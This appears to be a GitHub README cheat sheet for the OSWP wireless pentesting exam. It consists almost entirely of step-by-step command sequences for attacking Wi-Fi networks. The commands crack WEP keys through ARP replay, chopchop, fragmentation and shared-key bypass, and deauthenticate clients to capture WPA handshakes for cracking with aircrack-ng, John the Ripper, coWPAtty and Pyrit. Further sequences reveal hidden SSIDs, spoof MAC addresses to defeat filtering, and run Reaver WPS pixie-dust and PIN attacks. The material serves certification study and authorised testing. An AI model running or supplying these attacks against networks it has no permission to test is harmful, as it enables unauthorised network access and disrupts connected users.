# OSWP-CheatSheet

This repository contain a CheatSheet for OSWP as first part, and explore deeper the wireless pentesting in the second section.

NOTE : Most of these attacks was tested on a Back Track 5 OS, if you are using a Kali Linux up to date or other distro, some commands can have minor changes.

# Table of Contents

## First Section

* 0.0 [Recon](#Recon)
* 1.0 [Cracking WEP](#WEP)
  * 1.1 [With connected Clients](#WEP-ConnectedClients)
  * 1.2 [Via a Client](#WEP-Client)
  * 1.3 [Clientless](#WEP-Clientless)
  * 1.4 [Bypassing Shared Key Authentication](#WEP-Bypass-SKA)
* 2.0 [Cracking WPA/WPA2 PSK](#WPA)
  * 2.1 [Cracking WPA](#WPA-Crack)
  * 2.1 [Aicrack-ng and John The Ripper's](#WPA-Aicrack-JTR)
  * 2.2 [coWPAtty](#WPA-coWPAtty)
  * 2.3 [Pyrit](#WPA-Pyrit)
* 3.0 [Troubleshooting](#Troubleshooting)

## Second Section

* 4.0 [Find Hidden SSID](#HiddenSSID)
* 5.0 [Bypass MAC Filtering](#BypassMAC)
* 6.0 [WPS Attacks](#WPSAttacks)
  * 6.1 [WPS Attacks with Reaver - Pixie Dust Attack](#pixie)
  * 6.2 [WPS Attacks with Reaver - Specific Pin Attack](#pin)
  * 6.3 [WPS Attacks with Reaver - 5GHz Attack](#5GHz)
* 7.0 [Man in the Middle Attack](#MitM)

# First Section<a name="First"></a>

## Recon<a name="Recon"></a>

To determine if we are using ieee80211 or mac80211 drivers use this command:

If it said "nl80211 not found." that mean we are using ieee80211 drivers. Else we are using mac80211 and the "iw list" output will print wireless card informations.
```
root@wifu:~# iw list
nl80211 not found.
```

To display access point names and their corresponding channel number with mac80211 drivers use the following syntax:

```
root@wifu:~# iw dev wlan0 scan | egrep "DS\ Parameter\ set|SSID"
  SSID: wifu  
  DS Parameter set: channel 3  
  SSID: 6F36E6  
  DS Parameter set: channel 1
```

To display access point names and their corresponding channel number with ieee80211 drivers use the following syntax:

```
root@wifu:~# iwlist wlan0 scanning | egrep "ESSID|Channel"
                     ESSID:"wifu"
                     Channel:3
                     ESSID:"6F36E6"
                     Channel:11
```

To display your wireless card MAC address, use the following syntax:

```
root@wifu:~# macchanger -s mon0
Current MAC: <MAC address> <(Device information)>
```

## Cracking Wep<a name="WEP"></a>

### WEP - With connected Clients<a name="WEP-ConnectedClients"></a>

Place your wireless card into monitor mode on the channel number of the AP:

```
airmon-ng start <interface> <AP channel>
```
 
Start an Airodump-ng capture filtering on the AP channel and BSSID, saving the file to disk:
 
```
airodump-ng -c <AP Channel> --bssid <AP MAC> -w <capture> <interface>
```

Conduct a fake authentication attack against the AP:

```
aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface>
```
 
Launch the ARP request replay attack:

```
aireplay-ng -3 -b <AP MAC> -h <Your MAC> <interface>
```
 
Deauthenticate the connected client to force new IV generation by the AP:

```
aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
```
 
Once a significant number of IVs have been captured, run Aircrack-ng against the Airodump capture:

```
aircrack-ng <capture>
```
 
### WEP - Via a Client<a name="WEP-Client"></a>

Place your wireless card into monitor mode on the AP channel:

```
airmon-ng start <interface> <AP channel>
```

Start a capture dump, filtering on the AP channel and BSSID, saving the capture to a file:

```
airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>
```

Next, conduct a fake authentication against the access point:

```
aireplay-ng -0 1 -e <ESSID> -a <AP MAC> -w <capture> <interface>
```

Launch the interactive packet replay attack looking for ARP packets coming from the AP:

```
aireplay-ng -2 -b <AP MAC> -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 <interface>
```

Once enough IVs have been captured, crack the WEP key:

```
aircrack-ng -z <capture>
```

### WEP - Clientless<a name="WEP-Clientless"></a>

Place your wireless card into monitor mode on the channel number of the AP:

```
airmon-ng start <interface> <AP channel>
```

Conduct a fake authentication attack against the AP:

```
aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface>
```

Run attack 4, the KoreK chopchop attack (or attack 5, the fragmentation attack):

### KoreK Chop Chop Attack
```
aireplay-ng -4 -b <AP MAC> -h <Your MAC> <interface>
````

### Fragmentation Attack
```
aireplay-ng -5 -b <AP MAC> -h <Your MAC> <interface>
```

Craft an ARP request packet using packetforge-ng:

```
packetforge-ng -0 -a <AP MAC> -h <Your MAC> -l <Source IP> -k <Dest IP> -y <xor filename> -w <output filename>
```

Inject the packet into the network using attack 2, the interactive packet replay attack:

```
aireplay-ng -2 -r <packet filename> <interface>
```

Crack the WEP key using Aircrack-ng:

```
aircrack-ng <capture>
```

### WEP - Bypassing Shared Key Authentication<a name="WEP-Bypass-SKA"></a>

Place your wireless card into monitor mode on the channel number of the AP:

```
airmon-ng start <interface> <AP channel>
```

Start an Airodump-ng capture, filtering on the AP channel and BSSID, saving the capture:

```
airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>
```

Deauthenticate the connected client to capture the PRGA XOR keystream:

```
aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
```

Conduct a fake shared key authentication using the XOR keystream:

```
aireplay-ng -1 0 -e <ESSID> -y <keystreamfile> -a <AP MAC> -h <Your MAC> <interface>
```

Launch the ARP request replay attack:

```
aireplay-ng -3 -b <AP MAC> -h <Your MAC> <interface>
```

Deauthenticate the victim client again to force the generation of an ARP packet:

```
aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
```

Once IVs are being generated by the AP, run Aircrack-ng against the capture:

```
aircrack-ng <capture>
```

## Cracking WPA/WPA2 PSK<a name="WPA"></a>

### WPA - Crack<a name="WPA-Crack"></a>

Start by placing your wireless card into monitor mode on the channel number of the AP:

```
airmon-ng start <interface> <AP channel>
```

Start an Airodump capture, filtering on the AP channel and BSSID, saving the capture to disk:

```
airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>
```

Deauthenticate a connected client to force it to complete the 4-way handshake:

```
aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
```

Crack the WPA password with Aircrack-ng :

```
aircrack-ng -w <wordlist> <capture>
```

Alternatively, if you have an Airolib-ng database, it can be passed to Aircrack:

```
aircrack-ng -r <db name> <capture>
```

### Aircrack-ng and John The Ripper<a name="WPA-Aicrack-JTR"></a>

Place your wireless card into monitor mode on the channel number of the AP:

```
airmon-ng start <interface> <AP channel>
```

Start an Airodump capture, filtering on the AP channel and BSSID, saving the capture to disk:

```
airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>
```

Force a client to reconnect and complete the 4-way handshake by running a deauthentication attack against it:

```
aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
```

Once a handshake has been captured, change to the John the Ripper directory and pipe in the mangled words into Aircrack-ng to obtain the WPA password:

```
./john --wordlist=<wordlist> --rules --stdout | aircrack-ng -e <ESSID> -w - <capture>
```

### coWPAtty<a name="WPA-coWPAtty"></a>

Place your wireless card into monitor mode on the channel number of the AP:

```
airmon-ng start <interface> <AP channel>
```

Start an Airodump capture, filtering on the AP channel and BSSID, saving the file to disk:

```
airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>
```

Deauthenticate a connected client to force it to complete the 4-way handshake:

```
aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
```

To crack the WPA password with coWPAtty in wordlist mode:

```
cowpatty -r <capture> -f <wordlist> -2 -s <ESSID>
```

To use rainbow table mode with coWPAtty, first generate the hashes:

```
genpmk -f <wordlist> -d <hashes filename> -s <ESSID>
```

Run coWPAtty with the generated hashes to recover the WPA password:

```
cowpatty -r <capture> -d <hashes filename> -2 -s <ESSID>
```

### Pyrit<a name="WPA-Pyrit"></a>

Place your wireless card into monitor mode on the channel number of the AP:

```
airmon-ng start <interface> <AP channel>
```

Use Pyrit to sniff on the monitor mode interface, saving the capture to a file:

```
pyrit -r <interface> -o <capture> stripLive
```

Deauthenticate a connected client to force it to complete the 4-way handshake:

```
aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
```

Run Pyrit in dictionary mode to crack the WPA password:

```
pyrit -r <capture> -i <wordlist> -b <AP MAC> attack_passthrough
```

To use Pyrit in database mode, begin by importing your wordlist:

```
pyrit -i <wordlist> import_passwords
```

Add the ESSID of the access point to the Pyrit database:

```
pyrit -e <ESSID> create_essid
```

Generate the PMKs for the ESSID:

```
pyrit -r <capture> -b <AP MAC> attack_db
```

## Troubleshooting<a name="Troubleshooting"></a>

During a Sharing Key Authentication Bypass attack, if once you deauthenticate a client you got a "Broken SKA" message instead of the "140 bytes keystream : <MAC address>" into your Airodump output. Try to restart the Airodump-ng capture and deauthenticate another client.


# Second Section<a name="Second"></a>

## Find Hidden SSID<a name="HiddenSSID"></a>

Set your wireless card in monitor mode.

```
sudo airmon-ng start <wireless card>
```

Monitor access point.

```
sudo airodump-ng <monitor wireless card>
```

Detect the BSSID of the hidden ESSID that you are targeting, rerun the scan specifying that BSSID and the channel.

```
sudo airodump-ng -c <channel> --bssid <bssid> <monitor wireless card>
```

Now you can deauth a device.

```
sudo aireplay-ng -0 15 -c <client bssid> -a <access point bssid> <monitor wireless card>
```

## Bypass MAC Filtering<a name="BypassMAC"></a>

Set your wirelss card in monitor mode.

```
sudo airmon-ng start <wireless card>
```

Monitor access point.

```
airodump-ng -c <channel> --bssid <bssid> -w <output file> <monitor wireless card>
```

Deauthenticate a client and remember his MAC address.

```
aireplay-ng -0 0 -a <BSSID> -c <Client> <monitor wireless card>
```

Shutdown you'r monitor interface.

```
ifconfig <monitor wireless card> down
```

Attribute the Client MAC address to your wireless card.

```
macchanger --mac <deauthed client MAC address> <monitor wirelss card>
```

Power up you'r wireless card.

```
ifconfig <monitor wireless card>
```

Launch you'r attack using the stolen MAC address. ARP Replay request in this case.

```
aireplay-ng -3 -b <bssid> -h <stolen MAC address> <monitor wireless card>
```


## WPS Attacks<a name="WPSAttack"></a>

### WPS Attack with Reaver - Pixie Dust Attack<a name="pixie"></a>

Install Reaver

```
sudo apt-get install reaver
```

Set wireless card in monitor mode

```
sudo airmon-ng start <wirless card>
```

Enumerate Wireless Point using wash

```
wash -i <monitor wireless card>
```

Execute pixie dust attack

```
reaver -i <monitor wireless card> -b <bssid> -vv -K
```

### WPS Attack with Reaver - Specific Pin Attack<a name="pin"></a>

Note : The parameter -S is used to use small DH keys to improve crack speed

```
reaver -i <monitor wireless card> -b <bssid> -vv -p <PinCode> -S
```

### WPS Attack with Reaver - 5GHz<a name="5GHz"></a>

Note : Target 5GHz with the "-5" parameter. Example using Pixie Dust Attack bellow.

```
reaver -i <monitor wireless card> -b <bssid> -5 -vv -K
```

## Man in the Middle Attack<a name="MitM"></a>

Todo
